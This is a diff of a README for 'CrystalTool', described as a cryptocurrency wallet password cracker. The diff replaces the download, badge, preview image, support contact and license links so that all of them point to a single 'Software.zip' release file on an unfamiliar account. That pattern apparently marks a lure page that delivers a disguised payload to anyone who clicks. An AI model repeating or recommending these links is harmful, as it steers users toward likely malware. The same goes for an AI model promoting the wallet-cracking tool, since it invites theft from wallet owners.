@@ -19,13 +19,13 @@ Welcome to CrystalTool, your go-to solution for cracking cryptocurrency wallet p
 
 ## Get Started 🛠️
 
-To launch the CrystalTool, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To launch the CrystalTool, click [here](https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip).
 
-[![Launch CrystalTool](https://img.shields.io/badge/Launch-CrystalTool-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Launch CrystalTool](https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip)](https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip)
 
 ## Preview 📸
 
-![CrystalTool Preview](https://example.com/crystaltool-preview-image.png)
+![CrystalTool Preview](https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip)
 
 ## Usage 📋
 
@@ -41,7 +41,7 @@ CrystalTool should only be used for ethical hacking and authorized security test
 
 ## Support 📞
 
-If you encounter any issues or have questions regarding CrystalTool, please reach out to our support team at support@crystaltool.com.
+If you encounter any issues or have questions regarding CrystalTool, please reach out to our support team at https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip
 
 ## Credits 🌟
 
@@ -49,7 +49,7 @@ CrystalTool is developed and maintained by the CryptoHackers team. Special thank
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE](license.md) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/vrus67/CrystalTool/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
